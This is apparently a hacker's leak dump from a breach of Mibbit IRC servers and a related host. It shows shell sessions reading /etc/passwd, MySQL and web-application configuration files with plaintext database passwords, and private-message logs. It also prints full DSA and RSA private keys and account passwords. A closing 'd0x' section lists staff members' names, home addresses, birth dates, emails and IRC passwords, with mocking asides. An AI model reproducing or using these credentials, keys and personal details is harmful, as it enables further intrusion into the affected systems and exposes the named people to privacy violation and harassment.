drwx------  2 wwwadmin wwwadmin   4096 Mar 15 20:53 .ssh
drwxr-xr-x  2 wwwadmin wwwadmin   4096 Mar 15 21:20 .vim
-rw-------  1 wwwadmin wwwadmin  13346 Aug 12 16:13 .viminfo
-rw-r--r--  1 wwwadmin wwwadmin   4425 Mar 15 20:53 .vimrc
-rw-r--r--  1 wwwadmin wwwadmin 993262 Mar 31 14:46 eggdrop1.6.20.tar.bz2
drwxr-xr-x  6 wwwadmin wwwadmin   4096 Apr 16 15:01 kenneth
drwxr-xr-x 10 wwwadmin wwwadmin   4096 Aug 13 02:00 loggerbot
-rw-r--r--  1 wwwadmin wwwadmin     45 Apr  5 20:40 test.php
root () tools:~# ls -al /OLD_DATA
total 132
drwxrwxrwx 20 root root  4096 Aug  6 23:14 .
drwxr-xr-x 22 root root  4096 Mar 15 22:22 ..
drwxr-xr-x  2 root root  4096 Mar 15 10:46 bin
drwxr-xr-x  2 root root  4096 Oct 20  2008 boot
drwxr-xr-x  4 root root  8192 Mar 15 09:49 dev
drwxr-xr-x 76 root root  4096 Mar 15 10:46 etc
drwxr-xr-x  5 root root  4096 Jan 12  2009 home
drwxr-xr-x 12 root root  8192 Mar 15 10:46 lib
drwx------  2 root root 16384 Nov 25  2008 lost+found
drwxr-xr-x  2 root root  4096 Nov 25  2008 media
drwxr-xr-x  2 root root  4096 Oct 20  2008 mnt
drwxr-xr-x  2 root root  4096 Nov 25  2008 opt
drwxr-xr-x  2 root root  4096 Oct 20  2008 proc
drwxr-xr-x  3 root root  4096 Mar  7 22:29 root
drwxr-xr-x  2 root root  4096 Mar 15 10:46 sbin
-rw-------  1 root root 31903 Jan 12  2009 sql0swW3A
drwxr-xr-x  2 root root  4096 Nov 25  2008 srv
drwxr-xr-x  2 root root  4096 Oct 14  2008 sys
drwxrwxrwt  4 root root  4096 Mar 15 09:49 tmp
drwxr-xr-x 11 root root  4096 Dec  9  2008 usr
drwxr-xr-x 15 root root  4096 Dec 17  2008 var
root () tools:~# ls -al /OLD_DATA/home
total 20
drwxr-xr-x  5 root     root     4096 Jan 12  2009 .
drwxrwxrwx 20 root     root     4096 Aug  6 23:14 ..
drwxr-xr-x 13     1001     1001 4096 Mar 15 10:46 ircadmin
drwxr-xr-x  4 wwwadmin wwwadmin 4096 Oct 12  2009 mibbit
drwxr-xr-x  8     1002     1002 4096 Mar 15 09:29 wwwadmin
root () tools:~# ls -al /OLD_DATA/home/ircadmin/ # ALL YOUR IRCD ARE BELONG TO US
total 146816
drwxr-xr-x 13 1001 1001      4096 Mar 15 10:46 .
drwxr-xr-x  5 root root      4096 Jan 12  2009 ..
-rw-------  1 1001 1001     14707 Mar 14 23:29 .bash_history
-rw-r--r--  1 1001 1001       220 May 12  2008 .bash_logout
-rw-r--r--  1 1001 1001      3115 May 12  2008 .bashrc
-rw-------  1 1001 1001        41 Jun  1  2010 .lesshst
-rw-------  1 1001 1001       256 Mar 12 14:44 .nano_history
-rw-r--r--  1 1001 1001       675 May 12  2008 .profile
drwxr-xr-x  2 1001 1001      4096 Mar  7 23:44 .ssh
-rw-------  1 1001 1001       821 May 21  2009 .viminfo
drwxr-xr-x 13 1001 1001      4096 Jan  5  2010 Unreal3.2.7
drwx------ 13 1001 1001      4096 Apr 13  2009 Unreal3.2.8
drwx------ 13 1001 1001      4096 Dec 22  2010 Unreal3.2.8.1
-rw-r--r--  1 1001 1001   8181760 Sep  9  2009 Unreal3.2.8.1.tar
-rw-r--r--  1 1001 1001   8181760 Apr  7  2009 Unreal3.2.8.tar
drwxr-xr-x  7 1001 1001      4096 Feb  3  2009 anope-1.8.0-rc1
drwxr-xr-x  8 1001 1001      4096 Jan  7  2009 bopm
drwxr-xr-x  5 1001 1001      4096 Jan  7  2009 bopm-3.1.3
-rw-------  1 1001 1001      1475 Jul 30  2009 dead.letter
drwxr-xr-x  2 1001 1001      8192 Mar 12 14:44 dronebl
drwxr-xr-x  3 1001 1001      4096 May  4  2009 hub
drwxr-xr-x  9 1001 1001      4096 Mar 15 10:46 infobot-0.45.3
-rw-r--r--  1 1001 1001        81 Jan 26  2010 irc.us.mibbit.net.txt
-rw-r--r--  1 1001 1001 132744770 Feb 28  2010 ircd.tgz
-rw-r--r--  1 1001 1001       623 Oct 27  2009 jim
-rw-------  1 1001 1001    949701 Feb  8  2010 mbox
drwxr-xr-x  7 1001 1001      4096 Jan 26  2010 services

:: 0x03 - PM logs - tools.mibbit.com ::

root () tools:~# mysql -u root -ped4e5c6e88e5
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 95641
Server version: 5.1.41-3ubuntu12.10 (Ubuntu)
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> use www;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
mysql> select concat(fromNick,' -> ',toNick,': ',data) from pmlogs;
 
jared -> molkmin: can the admins tell when users PM each other on this network?
jared -> molkmin: (with mibbit)
molkmin -> jared: who do you wnat to know is saying what?
jared -> molkmin: but they don't have to know that :)

            karma motherfuck3r

 
molkmin -> alpha: not that I can see 
molkmin -> alpha: I wasn't watching 
molkmin -> alpha: it hardly matters :) 
alpha -> molkmin: just silenced them 
alpha -> molkmin: :) 
molkmin -> alpha: everyone in #chat is assholes :) 
alpha -> molkmin: lol 
alpha -> molkmin: thanks 

            thX


jared -> molkmin: i've seen some scary botnets on dalnet 
jared -> molkmin: they could knock you off the server in less than a second 
molkmin -> jared: I've never had that happen yet 
molkmin -> jared: I have a mac 

            ??


jared -> molkmin: VNCing into a linux box 
jared -> molkmin: with a windows virtualbox guest 
jared -> molkmin: to use the VPN 
jared -> molkmin: to connect to a terminal server at work 
jared -> molkmin: friggin ridiculous 
molkmin -> jared: get a freaking mac 
jared -> molkmin: how would that help? 

            ...


[h () ck ~]$ wc mibbitpms.out 
  51610  493903 2955301 mibbitpms.out
[h () ck ~]$ wc mibbitchanmsgs.out 
  622607  4558597 32539145 mibbitchanmsgs.out

            f1les @ 0x07 <<<


:: 0x04 - status.mibbit.com ::
[h () ck ~]$ ssh wwwadmin () status mibbit com
wwwadmin () status mibbit com's password: 
Last login: Fri Aug 12 21:18:51 2011 from [redacted]
wwwadmin () status:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
mysql:x:104:105:MySQL Server,,,:/var/lib/mysql:/bin/false
mibbit:x:1000:1000::/home/mibbit:/bin/bash
wwwadmin:x:1001:1001::/home/wwwadmin:/bin/bash
zfreebies:x:1002:1002::/home/zfreebies:/bin/bash
smmta:x:105:107:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:106:108:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
jimmy:x:1003:1003::/home/jimmy:/bin/bash
bind:x:107:109::/var/cache/bind:/bin/false
wwwadmin () status:~$ ls -alt /
total 92
drwxrwxrwt  4 root root  4096 Aug 13 07:25 tmp
drwxr-xr-x 78 root root  4096 Aug 13 01:14 etc
drwxr-xr-x 21 root root  4096 Jul  7 07:40 .
drwxr-xr-x 21 root root  4096 Jul  7 07:40 ..
drwxr-xr-x 11 root root 12760 Jul  7 07:40 dev
drwxr-xr-x 11 root root     0 Jul  7 07:40 sys
dr-xr-xr-x 99 root root     0 Jul  7 07:40 proc
drwxr-xr-x  2 root root  4096 May 29 23:11 bin
drwxr-xr-x 15 root root 12288 May 29 23:11 lib
drwx------  3 root root  4096 May 29 23:11 root
drwxr-xr-x  2 root root  4096 Nov  6  2010 sbin
drwxr-xr-x  6 root root  4096 Mar  4  2010 home
drwxr-xr-x 11 root root  4096 Sep 30  2009 usr
drwxr-xr-x 14 root root  4096 Aug 11  2009 var
drwxr-xr-x  2 root root  4096 Apr 23  2009 media
drwxr-xr-x  2 root root  4096 Apr 23  2009 opt
drwxr-xr-x  2 root root  4096 Apr 23  2009 srv
drwx------  2 root root 16384 Apr 23  2009 lost+found
drwxr-xr-x  2 root root  4096 Apr 13  2009 boot
drwxr-xr-x  2 root root  4096 Apr 13  2009 mnt
drwxr-xr-x  2 root root  4096 Mar  6  2009 selinux
wwwadmin () status:~$ ls -alt /home
total 24
drwxr-xr-x  6 wwwadmin  wwwadmin  4096 Aug 12 21:44 wwwadmin
drwxr-xr-x 21 root      root      4096 Jul  7 07:40 ..
drwxr-xr-x  7 mibbit    mibbit    4096 Jun 29 13:30 mibbit
drwxr-xr-x  4 zfreebies zfreebies 4096 Apr 29  2010 zfreebies
drwxr-xr-x  3 jimmy     jimmy     4096 Mar  8  2010 jimmy
drwxr-xr-x  6 root      root      4096 Mar  4  2010 .
wwwadmin () status:~$ ls -alt
total 52
drwxr-xr-x 6 wwwadmin wwwadmin 4096 Aug 12 21:44 .
-rw------- 1 wwwadmin wwwadmin 1979 Aug 12 21:44 .mysql_history
-rw------- 1 wwwadmin wwwadmin  120 Aug 12 05:15 .nano_history
drwxrwxrwx 2 wwwadmin wwwadmin 4096 Aug  7 18:29 .ssh
-rw------- 1 wwwadmin wwwadmin 6566 Aug  7 15:02 .bash_history
drwxr-xr-x 3 wwwadmin wwwadmin 4096 Jan 26  2011 wiki_new
drwxr-xr-x 4 wwwadmin wwwadmin 4096 Jan 25  2011 wiki_backup_25Jan
lrwxrwxrwx 1 root     root       31 Jan 17  2011 blog -> /var/www/blog.mibbit.com/htdocs
drwxr-xr-x 2 wwwadmin wwwadmin 4096 Dec 10  2010 WP_BACKUP
drwxr-xr-x 6 root     root     4096 Mar  4  2010 ..
lrwxrwxrwx 1 wwwadmin wwwadmin   32 Sep 13  2009 wiki -> /var/www/wiki.mibbit.com/htdocs/
-rw-r--r-- 1 wwwadmin wwwadmin  220 Mar  2  2009 .bash_logout
-rw-r--r-- 1 wwwadmin wwwadmin 3115 Mar  2  2009 .bashrc
-rw-r--r-- 1 wwwadmin wwwadmin  675 Mar  2  2009 .profile
wwwadmin () status:~$ ls -alt /var/www/
total 56
drwxr-xr-x  4 root     root     4096 May 12  2010 www.stopitmovies.com
drwxr-xr-x 13 root     root     4096 May 12  2010 .
drwxr-xr-x  4 root     root     4096 Mar 24  2010 status.mibbit.com
drwxr-xr-x  4 root     root     4096 Mar 16  2010 a.mibbit.com
drwxr-xr-x  6 root     root     4096 Feb 19  2010 blog.mibbit.com
drwxr-xr-x  4 root     root     4096 Dec 23  2009 adminwiki.mibbit.com
drwxr-xr-x  4 root     root     4096 Oct 12  2009 www.rollered.com
drwxr-xr-x  4 root     root     4096 Oct 12  2009 www.wizzig.com
drwxr-xr-x  4 www-data www-data 4096 Oct 12  2009 www.axod.net
drwxr-xr-x  5 root     root     4096 Sep 30  2009 www.zfreebies.com
drwxr-xr-x  5 root     root     4096 Sep 15  2009 forum.zfreebies.co.uk
drwxrwxr-x  5 www-data www-data 4096 Sep 13  2009 wiki.mibbit.com
-rw-r--r--  1 root     root       45 Aug 11  2009 index.html
drwxr-xr-x 14 root     root     4096 Aug 11  2009 ..
wwwadmin () status:~$ cat /var/www/a.mibbit.com/htdocs/admin/index.php | head -n 3
<?
        $sql = @mysql_connect(""127.0.0.1"", ""advertuser"", ""e5e32f36aa88"");
        @mysql_select_db(""adverts"", $sql);
wwwadmin () status:~$ cat /var/www/a.mibbit.com/htdocs/sessionError.php | head -n 3
<?

    $sql = @mysql_connect(""127.0.0.1"", ""root"", ""5068c8055ffc"");
wwwadmin () status:~$ ls -alt /var/www/blog.mibbit.com/htdocs
total 308
drwxr-xr-x 5 wwwadmin wwwadmin  4096 Nov 15  2010 .
-rw-r--r-- 1 wwwadmin www-data   655 Nov 15  2010 favicon.ico
drwxr-xr-x 5 wwwadmin www-data  4096 Feb 23  2010 wp-content
-rw-r--r-- 1 wwwadmin www-data  1548 Feb 19  2010 wp-config.php
-rw-r--r-- 1 wwwadmin www-data 93445 Feb 19  2010 xmlrpc.php
-rw-r--r-- 1 wwwadmin www-data 23097 Feb 19  2010 wp-settings.php
-rw-r--r-- 1 wwwadmin www-data  3693 Feb 19  2010 wp-trackback.php
-rw-r--r-- 1 wwwadmin www-data   218 Feb 19  2010 wp-rss.php
-rw-r--r-- 1 wwwadmin www-data   220 Feb 19  2010 wp-rss2.php
-rw-r--r-- 1 wwwadmin www-data  7578 Feb 19  2010 wp-mail.php
-rw-r--r-- 1 wwwadmin www-data   487 Feb 19  2010 wp-pass.php
-rw-r--r-- 1 wwwadmin www-data   218 Feb 19  2010 wp-rdf.php
-rw-r--r-- 1 wwwadmin www-data   316 Feb 19  2010 wp-register.php
-rw-r--r-- 1 wwwadmin www-data  2341 Feb 19  2010 wp-load.php
-rw-r--r-- 1 wwwadmin www-data 22721 Feb 19  2010 wp-login.php
drwxr-xr-x 6 wwwadmin www-data  4096 Feb 19  2010 wp-includes
-rw-r--r-- 1 wwwadmin www-data  1946 Feb 19  2010 wp-links-opml.php
-rw-r--r-- 1 wwwadmin www-data   220 Feb 19  2010 wp-feed.php
-rw-r--r-- 1 wwwadmin www-data  1253 Feb 19  2010 wp-cron.php
-rw-r--r-- 1 wwwadmin www-data   238 Feb 19  2010 wp-commentsrss2.php
-rw-r--r-- 1 wwwadmin www-data  2616 Feb 19  2010 wp-config-sample.php
-rw-r--r-- 1 wwwadmin www-data 40400 Feb 19  2010 wp-app.php
-rw-r--r-- 1 wwwadmin www-data   220 Feb 19  2010 wp-atom.php
-rw-r--r-- 1 wwwadmin www-data   274 Feb 19  2010 wp-blog-header.php
-rw-r--r-- 1 wwwadmin www-data  3928 Feb 19  2010 wp-comments-post.php
drwxr-xr-x 8 wwwadmin www-data  4096 Feb 19  2010 wp-admin
-rw-r--r-- 1 wwwadmin www-data 15410 Feb 19  2010 license.txt
-rw-r--r-- 1 wwwadmin www-data  7644 Feb 19  2010 readme.html
-rw-r--r-- 1 wwwadmin www-data   397 Feb 19  2010 index.php
drwxr-xr-x 6 root     root      4096 Feb 19  2010 ..
wwwadmin () status:~$ cat /var/www/blog.mibbit.com/htdocs/wp-config.php | head -n 8
<?php
// ** MySQL settings ** //
define('DB_NAME', 'wpblog');    // The name of the database
define('DB_USER', 'wpuser');     // Your MySQL username
define('DB_PASSWORD', '13c3cada3921'); // ...and password
define('DB_HOST', 'localhost');    // 99% chance you won't need to change this value
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
wwwadmin () status:~$ ls -alt /var/www/wiki.mibbit.com/htdocs/
total 720
-rw-rw-r--  1 www-data www-data   6960 Mar 21 12:46 LocalSettings.php
drwxrwxr-x  9 www-data www-data   4096 Mar 21 12:41 extensions
drwxr-xr-x  2 wwwadmin wwwadmin   4096 Jan 26  2011 SpamBlacklist
drwxrwxr-x 17 www-data www-data   4096 Jan 26  2011 .
drwxrwxr-x 22 www-data www-data   4096 Jan 26  2011 images
drwxrwxr-x  2 www-data www-data   4096 Jan 26  2011 bin
drwxrwxr-x  2 www-data www-data   4096 Jan 26  2011 config
drwxrwxr-x  4 www-data www-data   4096 Jan 26  2011 docs
drwxrwxr-x 17 www-data www-data   4096 Jan 26  2011 includes
drwxrwxr-x  4 www-data www-data   4096 Jan 26  2011 languages
drwxrwxr-x 13 www-data www-data  12288 Jan 26  2011 maintenance
drwxrwxr-x  2 www-data www-data   4096 Jan 26  2011 math
drwxrwxr-x  2 www-data www-data   4096 Jan 26  2011 serialized
drwxrwxr-x 10 www-data www-data   4096 Jan 26  2011 skins
drwxr-xr-x  2 wwwadmin wwwadmin   4096 Jan  4  2011 cache
-rw-r--r--  1 wwwadmin wwwadmin  59433 Jan  4  2011 RELEASE-NOTES
-rw-r--r--  1 wwwadmin wwwadmin   2090 Jan  4  2011 CREDITS
-rw-r--r--  1 wwwadmin wwwadmin   8821 Jan  4  2011 profileinfo.php
-rw-rw-r--  1 root     root        655 Nov 15  2010 favicon.ico
-rw-r--r--  1 wwwadmin wwwadmin  13307 Mar 25  2010 UPGRADE
-rw-r--r--  1 wwwadmin wwwadmin 392287 Mar 12  2010 HISTORY
-rw-r--r--  1 wwwadmin wwwadmin   4905 Mar  8  2010 thumb.php
-rw-r--r--  1 wwwadmin wwwadmin   4707 Feb 15  2010 api.php
-rw-r--r--  1 wwwadmin wwwadmin    174 Feb  3  2010 php5.php5
-rw-r--r--  1 wwwadmin wwwadmin     89 Feb  3  2010 redirect.phtml
-rw-r--r--  1 wwwadmin wwwadmin     86 Feb  3  2010 wiki.phtml
-rw-r--r--  1 wwwadmin wwwadmin   4329 Jan  1  2010 index.php
-rw-r--r--  1 wwwadmin wwwadmin   4031 Oct 14  2009 img_auth.php
-rw-rw-r--  1 www-data www-data   9416 Sep 13  2009 mibbit.png
-rw-rw-r--  1 www-data www-data   1049 Sep 13  2009 AdminSettings.php
drwxrwxr-x  5 www-data www-data   4096 Sep 13  2009 ..
-rw-r--r--  1 wwwadmin wwwadmin     76 Jul 27  2009 FAQ
drwxrwxr-x  4 www-data www-data   4096 Jul 13  2009 t
drwxrwxr-x  2 www-data www-data   4096 Jul 13  2009 tests
-rw-r--r--  1 wwwadmin wwwadmin    648 May  7  2009 StartProfiler.sample
-rw-rw-r--  1 www-data www-data   3952 Mar 21  2009 install-utils.inc
-rw-r--r--  1 wwwadmin wwwadmin   3054 Mar 21  2009 opensearch_desc.php
-rw-r--r--  1 wwwadmin wwwadmin    383 Mar 21  2009 redirect.php
-rw-r--r--  1 wwwadmin wwwadmin     32 Mar 16  2009 trackback.php5
-rw-rw-r--  1 www-data www-data    603 Jan  7  2009 StartProfiler.php
-rw-r--r--  1 wwwadmin wwwadmin   3649 Nov 11  2008 README
-rw-r--r--  1 wwwadmin wwwadmin   1347 Nov  5  2008 trackback.php
-rw-r--r--  1 wwwadmin wwwadmin   4138 Apr 18  2008 INSTALL
-rw-rw-r--  1 www-data www-data    618 Apr 11  2008 Makefile
-rw-r--r--  1 wwwadmin wwwadmin     39 Mar  3  2008 opensearch_desc.php5
-rw-r--r--  1 wwwadmin wwwadmin     25 Feb  4  2008 api.php5
-rw-r--r--  1 wwwadmin wwwadmin     31 Feb  4  2008 img_auth.php5
-rw-r--r--  1 wwwadmin wwwadmin     28 Feb  4  2008 index.php5
-rw-r--r--  1 wwwadmin wwwadmin     31 Feb  4  2008 redirect.php5
-rw-r--r--  1 wwwadmin wwwadmin     29 Feb  4  2008 thumb.php5
-rw-r--r--  1 wwwadmin wwwadmin  17997 Apr  5  2006 COPYING
wwwadmin () status:~$ cat /var/www/wiki.mibbit.com/htdocs/LocalSettings.php | grep ""password"" -C 5

$wgDBtype           = ""mysql"";
$wgDBserver         = ""localhost"";
$wgDBname           = ""wikidb"";
$wgDBuser           = ""wikiuser"";
$wgDBpassword       = ""a69e74574db6"";
$wgDBport           = ""5432"";
$wgDBprefix         = """";
$wgDBadminuser      = ""wikiuser"";
$wgDBadminpassword  = ""a69e74574db6"";

# Schemas for Postgres
$wgDBmwschema       = ""mediawiki"";
$wgDBts2schema      = ""public"";
wwwadmin () status:~$ cat /var/www/adminwiki.mibbit.com/htdocs/LocalSettings.php | grep ""password"" -C 5
## Database settings
$wgDBtype           = ""mysql"";
$wgDBserver         = ""localhost"";
$wgDBname           = ""wikiadmindb"";
$wgDBuser           = ""wikiadminuser"";
$wgDBpassword       = ""fe102b0d7793"";

# MySQL specific settings
$wgDBprefix         = """";

# MySQL table options to use during installation or update
wwwadmin () status:~$ exit
Connection to status.mibbit.com closed.


:: 0x05 - sidewinder.netonecom.net ::
backup () sidewinder ~> ls -al # read world backups of all servers with /etc/shadow ROFL
total 596
drwxr-xr-x 16 backup root     432 2011-08-12 18:52 .
drwxr-xr-x 26 root   root     632 2011-05-12 14:12 ..
drwxr-xr-x  2 backup users   1344 2009-08-27 10:44 amram
drwxr-xr-x  2 root   root  587920 2011-08-13 12:37 awstats
-rw-------  1 backup  1452     17 2006-09-18 14:47 .bash_history
drwxr-xr-x  2 backup users    224 2009-10-07 12:58 hornet
drwxr-xr-x  2 backup users   1336 2010-08-24 11:23 ice
drwxr-xr-x  2 backup users   1216 2010-11-12 16:07 janco
drwxr-xr-x  3 backup users    264 2011-08-13 01:27 magic
drwxr-xr-x  3 backup users   1416 2011-07-26 12:32 merlin
drwxr-xr-x  2 backup users   1432 2011-05-16 05:55 multimag
drwxr-xr-x  2 backup users   1640 2010-10-11 15:49 phantom
drwxr-xr-x  2 backup users   1680 2011-01-13 15:57 sidewinder
drwx------  2 backup users    320 2011-08-12 18:52 .ssh
drwxr-xr-x  2 backup users   1176 2009-10-14 10:52 sydex
-rw-------  1 backup  1452   4999 2011-08-12 18:52 .viminfo

backup () sidewinder ~/.ssh> cat id_dsa id_rsa # not identity, its not ASCII            
-----BEGIN DSA PRIVATE KEY-----
MIIDPwIBAAKCAQEA1KnQoLv0drmXUon9nIZUlXhQ7f6iMU0o5xlpbUg0Kwx5cXVB
mhn4gsr4CDk49+fYr29tuHn0NycY2lwuaMUV2yP15Pd05Wx/jgYgKTdaqZaZaIPX
OXbGAdFz3cd13g5pTAwDLblNp6gI4PlcXO/adN1ywOyLzVCmPHcBZqevPLMcL52v
b2ECeBuXKU5Z9leFoOF9IdkhZXTnsvj/yFLy8ZMpBD5JUyCXTfXw7cZZUko1X5wg
1lN76c+A0JKm0cMq8+NvA8ufRaGL2FXUv3McljrcTaRXMksWG3Z/KxEHsh3UY+pH
iNFESYED0jl4o84P6GLIxr7hlqQxpV0TyhwCiQIVALmyxXXqqqrEa83KyCyz557b
qdaLAoIBAQC3+GjuKabODKLSiRAgngwq88L1OJ45HtXyLIBudHLky0JM/nbUVx4f
coQip4jeLx17cMHK7Q/8gY13O81eQe8+IZ2De94PFL2troDsEW28R+7LOKcvidWp
+y2edoU77+/p2aLBUwmiYxlcmX1+w0iH/U/eMZUjtQJ6rawWFnaykBUazZjFNQdn
ZNusvxa4SKOf9Nx5qyXwSW52gqd1dNnrJFu0C10p3Y6ErllVwp5iUTAPPlOeGFnD
hoeu9FiLMVmJHzmiNDLCr6koBkEv+xQl6aL3DQRC7PymyYitltXTf1bf49kDrMWC
7BWuV3PD2pStnu1APfBALYI4DYplfO8MAoIBAQCRKSygD8aMdX83qgMCM6tphVun
snCtDZXhqLpx70aQvgZWoKYQLzdjdcicdSn9JtiWiUOzeS9A4ee5pizMwQOcbn1R
mnwIJe+36EwvCB1nhcwClGJz1ZFVR3JjMJAWob4LkYKnWPjvbLotjr1nMwCKyYRp
swTW1YZFfmodQkoPwdZ4dNKAyxxbLtWCL//l0WlTuzAfVTV4xxI/+BcfaxwW8O9W
XGj/dQwT8TjSqSUlJ2o5S6NX1tD0CmpfJ6JhcEIhAgcO2D2H15h+SZQCGkTB5Lx6
yI4A1msNuosa2+e8txxkoFZ/zIN2EdSqI5nkybOEpq971I8y1ieYtN0bH1MlAhRm
ovpJJvoWRqPg6WS+lyV49RWzMw==
-----END DSA PRIVATE KEY-----
-----BEGIN RSA PRIVATE KEY-----
MIIEoAIBAAKCAQEA43hMo7RV/7O4jNNzcGLrA2NA7kzA3RkcYnNw/lX2iJd0qR2n
a+GEySa/RtAbRRrxTDRgQ4H4LvrNGttoRIUS6gsMNpC4jxHUhzdYQikedNUNEA81
Ro7qMOULpRy9eoE0kntWIxyi5lpoSKR67KEkfhoChSe3ZEa0HqGumGWvhKJIdNtZ
Rd3GJc9HvzIr5rKxgmw4oQP9AHhhuwHTmVVLpkCI+eL8uemH+Bp8BHGNXZ4RtN50
oFB+09vtTfgCELYtAjZf6LQMCqdu6wLDx6VPxz1L6ukSoU6Oljka7Ktxjd9YR/ZU
dbmORCArArxW606rbLa9vspcWXpWBbNEwyiCXQIBIwKCAQBUfSPHxqOZfUSMFAZO
UKBu+PrcKyMQSyfMy8riH+3a9m0o3yDtjkdDZinJ2ESko5t0E3Q2VNiGemlwYB9p
6EjalmOfPRFZtipeG970AKTpkPY5KjhcCTJp7qyNyNip2DgZJn8UWxfvKOTnyBBm
hP7tAli1HWFfwn1qdpFOjCs/484Gryp0q+WFdrNrPJ1/8zqAUyqJj0cTXv6Pyeyl
RGkFmggFQgjhT/+rlrbqreMaiUMxUT2GjlvDNATrIydQVFyxIuF2El5lTVRWzV0m
rxTLTzxmZkgum+ANEC5pBNqGiTkPa2sCvRC3gtKmaZmFh6bv2/bbFOYCOEyHMfML
tQLPAoGBAPVaMLkmuQW+CUfGb+qCz/pHxDVG0Vj97GFgs1eIoskn5/3CSX9tkkTV
mKHQ3cFiV0QJWyy0MQOCTzC/yHPRj0DrZqsnOVufc1HVIADck1NKBVcXUyhRlbcB
1qW3IXeagr+lmZeVB+8WtM3oD9d8HY+Gvx+4O8ES9Am85kGfuQ8TAoGBAO1XcJBH
fVZ2mhzrvJlaLHwv730i6/hYPXphB3UYq48gfsRkhT4BbDBUiZ7201TbN7ZOHrX4
AqumdtayqYbdCLd0+6SDmAELsrAsMAM0JuvjsWXnR3a+i1T7D4Iay62c13UqFCae
PnIrqK/Qy0SRiNCbRPG4uM2PUS96Wjm1JabPAoGAfi5iM1W+PXetAFdswb+eKPG1
XTpdCTIhy64TFxMR48thXe7j+GQ8mG3Zd8qArJj5rfYu48piWZN5LwOLqUczuvy4
dUdfU7EWvF76hBmq2mCVCDfhn7Tt6Rbjayr7RNMeq7RAXJXJkOcbKBDyNE51mkVM
WXSxBDWiE6L6Ex7xdXcCgYA9B9sdyT18oiehCWsC3Kxacrns+lnvZyXAYhfcSCwd
fWJtA+e/fLVrg3PYa1rp7zo2MVharX0HkTSAWdPSONZbD3PoeZwdhqpKjwUII1p3
K+vJvyEBRvCg0tgaJCW+7dEA3u89IWCDwhVvCc3ebpDlLz2dPiDkZq557EMWJ0Qy
NQKBgFpovHwPC5k1bX9y2Sv7J+YgIiDgELsOxF9UQzWFzb1XCPczUA027RZTgLJX
ILQi0R8af8yCpxN3PUSQXtWwZXZMJZF9puFM2vXRe1Xd3kuZg4BEkoVtB5hYK5oE
yqzQAbROM2rLILM6Bj+zro5IApDQxJ4FokvNfhJm2JzdiSmo
-----END RSA PRIVATE KEY-----

jared () sidewinder netonecom net weJAruSE
http://www.2shared.com/file/-gqbHglO/jared.html (NicE priv8 keyz ;))
trix () sidewinder netonecom net trix4kids

molkmin -> jared: ah, you plan on lettingothers ssh in? 
jared -> molkmin: no i thought you did 
molkmin -> jared: hell no. 
jared -> molkmin: okay well then forget what i said 
molkmin -> jared: there are like 5 people that can ssh into sidewinder 
molkmin -> jared: or maybe 7 
jared -> molkmin: and only 2 of them are convicted felons 
molkmin -> jared: I just recently secured SSH 
jared -> molkmin: ahh so it won't allow IPs other than ours <<< You use open proxies too?
molkmin -> jared: got hacked..user used an account name of ""test"" password ""test"" <<< LOL 
jared -> molkmin: grr

:: 0x06 - d0x ::
Axod
Name: Jimmy Moore
Location: Probably out of the UK
NickServ: axod:383cf3a3f7c2
Oper: axod:ce18da2ddae4
Email: jimmy.moore () gmail com
Email2: jimmy () axod net
Email3: axod () axod net
Email4: axodmedia () gmail com
Mugshot: http://a1.twimg.com/profile_images/71426235/Photo_175.jpg
http://bizzy.co.uk/uk/05956691/axod-media
http://twitter.com/#!/mibbit
http://twitter.com/#!/axod
http://digg.com/axod
http://axod.blogspot.com/


Azander
Name: Alanon Zander
Address: 2132 South 29 Rd Cadillac, MI 49601
NickServ: Azander:kikicat
Oper: azander:flagon3
Email: alanonzander () gmail com <<< kikicat
Email2: alanonzander () yahoo com <<< password recovery sends back to gmail LOL
https://plus.google.com/113170461621014873855/posts
http://www.myspace.com/alanonzander
http://user.netonecom.net/~azander/alanon.htm


Havvy
Name: Ryan Havvy
Age: 18?
Address: Somewhere in Washougal, WA
NickServ: Havvy:hmagic
Oper: havvy:hknight
Email: ryan.havvy () gmail com
http://twitter.com/#!/havvy
http://havvy.wordpress.com/
http://www.stumbleupon.com/stumbler/Havvy/
havvy havvy
xkcd.com/936/ Password security explained in a couple panels.
10 Aug ^^^ coming from someone whose passwords are 6 lowercase characters?? hahahah


Hercule
Name: JÃ¼rgen Wind
Location: Germany
NickServ: Hercule:herc47
Oper: hercule:0b2ac71dc51f
Email: jwind () gmx de


Joshua
Name: Joshua Luckers
Age: 23
DOB: 06/15/1988
NickServ: Joshua:TwEaKeRs
Oper: joshua:ec31e1a98607
Email: joshua () sensiva net
Mugshot:http://mediacdn.disqus.com/uploads/users/146/1862/avatar92.jpg
http://joshualuckers.nl/

Kitsune
Name: Todd Parker
Email: kitsune () sbcglobal net
NickServ: Kitsune:undquiet
Oper: kitsune:$5T`mIb5705
http://nenolod.net/~nenolod/mibbit-debacle.html


Molkmin
Name: Thomas W Lyon
Age: 58
DOB: 06/04/1953
Address: 2188 US Highway 10 Sears, MI 49679-8073
NickServ: molkmin:sotw1btn
Oper: molkmin:ghotisotwbtn
